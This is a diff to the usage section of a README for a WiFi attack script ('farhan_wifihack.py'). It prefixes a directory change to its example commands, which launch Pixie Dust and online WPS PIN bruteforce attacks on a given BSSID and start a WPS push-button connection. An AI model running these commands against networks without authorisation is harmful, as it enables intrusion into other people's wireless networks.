@@ -119,19 +119,19 @@ termux-setup-storage
 ## Usage examples
 Start Pixie Dust attack on a specified BSSID:
  ```
- sudo python3 farhan_wifihack.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
+cd farhan_wifihack && sudo python3 farhan_wifihack.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
  ```
 Show avaliable networks and start Pixie Dust attack on a specified network:
  ```
- sudo python3 farhan_wifihack.py -i wlan0 -K
+cd farhan_wifihack &&  sudo python3 farhan_wifihack.py -i wlan0 -K
  ```
 Launch online WPS bruteforce with the specified first half of the PIN:
  ```
- sudo python3 farhan_wifihack.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
+cd farhan_wifihack &&  sudo python3 farhan_wifihack.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
  ```
  Start WPS push button connection:s
  ```
- sudo python3 farhan_wifihack.py -i wlan0 --pbc
+cd farhan_wifihack &&  sudo python3 farhan_wifihack.py -i wlan0 --pbc
  ```
 
 ## Troubleshooting
